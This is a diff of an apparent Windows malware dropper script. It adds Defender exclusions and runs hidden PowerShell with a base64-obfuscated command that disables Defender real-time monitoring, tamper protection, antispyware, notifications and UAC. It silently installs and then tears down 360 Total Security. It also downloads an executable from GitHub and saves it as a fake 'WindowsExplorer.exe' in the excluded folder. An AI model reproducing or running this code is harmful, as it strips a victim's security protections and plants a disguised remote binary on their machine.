@@ -14,16 +14,8 @@ Powershell Add-MpPreference -ExclusionProcess 'powershell.exe'
 Powershell Add-MpPreference -ExclusionPath 'C:\ProgramData\GG-Win'
 
 powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$c = 'cmVnIGFkZCAiSEtDVVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQdXNoTm90aWZpY2F0aW9ucyIgL3YgVG9hc3RFbmFibGVkIC90IFJFR19EV09SRCAvZCAwIC9mICYgcmVnIGFkZCAiSEtDVVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQdXNoTm90aWZpY2F0aW9ucyIgL3YgTG9ja1NjcmVlblRvYXN0RW5hYmxlZCAvdCBSRUdfRFdPUkQgL2QgMCAvZiAmIHJlZyBhZGQgIkhLQ1VcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cTm90aWZpY2F0aW9uc1xTZXR0aW5nc1xNc0VkZ2UiIC92IEVuYWJsZWQgL3QgUkVHX0RXT1JEIC9kIDAgL2YgJiByZWcgYWRkICJIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXE5vdGlmaWNhdGlvbnNcU2V0dGluZ3NcV2luZG93cy5EZWZlbmRlci5TZWN1cml0eUNlbnRlciIgL3YgRW5hYmxlZCAvdCBSRUdfRFdPUkQgL2QgMCAvZiAmIHJlZyBhZGQgIkhLQ1ZcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcRXhwbG9yZXIiIC92IERpc2FibGVOb3RpZmljYXRpb25DZW50ZXIgL3QgUkVHX0RXT1JEIC9kIDEgL2YgJiByZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nIC90IFJFR19EV09SRCAvZCAxIC9mICYgcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxGZWF0dXJlcyIgL3YgVGFtcGVyUHJvdGVjdGlvbiAvdCBSRUdfRFdPUkQgL2QgMSAvZiAmIHJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXIiIC92IERpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgJiByZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyIiAvdiBUYW1wZXJQcm90ZWN0aW9uIC90IFJFR19EV09SRCAvZCAxIC9mICYgcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlciIgL3YgRGlzYWJsZUFudGlTcHl3YXJlIC90IFJFR19EV09SRCAvZCAxIC9mICYgcmVnIGFkZCBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBFbmFibGVMVUEgL3QgUkVHX0RXT1JEIC9kIDAgL2Yn; $d = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($c)); Invoke-Expression $d"
-cls
 
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
-"$ins = '$env:TEMP\360TS_Setup.exe'; " ^
-"Invoke-WebRequest -Uri 'https://dl.360safe.com/totalsecurity/360TS_Setup_Official.exe' -OutFile $ins; " ^
-"Start-Process -FilePath $ins -ArgumentList '/S' -Wait; " ^
-"Start-Sleep -Seconds 45; " ^
-"Stop-Service -Name '360*' -Force -ErrorAction SilentlyContinue; " ^
-"Remove-Item -Path 'C:\Program Files (x86)\360' -Recurse -Force -ErrorAction SilentlyContinue; " ^
-"Remove-Item -Path $ins -Force"
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$ins = \"$env:TEMP\360TS_Setup.exe\"; Invoke-WebRequest -Uri 'https://dl.360safe.com/totalsecurity/360TS_Setup_Official.exe' -OutFile $ins; Start-Process -FilePath $ins -ArgumentList '/S' -Wait; Start-Sleep -Seconds 45; Stop-Service -Name '360*' -Force -ErrorAction SilentlyContinue; Remove-Item -Path 'C:\Program Files (x86)\360' -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -Path $ins -Force"
 
 mkdir "%systemdrive%\programdata\GG-Win" 2>nul
 PowerShell.exe -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadFile('https://github.com/Pango-IL/windows/raw/refs/heads/main/WindowsExploor.exe','%programdata%\GG-Win\WindowsExplorer.exe')
